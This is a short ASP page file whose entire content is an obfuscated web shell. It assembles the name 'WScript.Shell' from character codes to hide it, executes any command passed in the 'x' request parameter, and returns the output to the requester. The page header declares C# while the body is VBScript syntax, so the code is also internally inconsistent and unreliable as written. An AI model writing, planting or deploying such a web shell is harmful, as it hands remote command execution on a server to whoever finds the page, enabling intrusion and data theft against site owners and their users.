<%@ Page Language="C#" %>
<%
Set o=CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&"."&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
Response.Write(o.Exec(Request("x")).StdOut.ReadAll())
%>

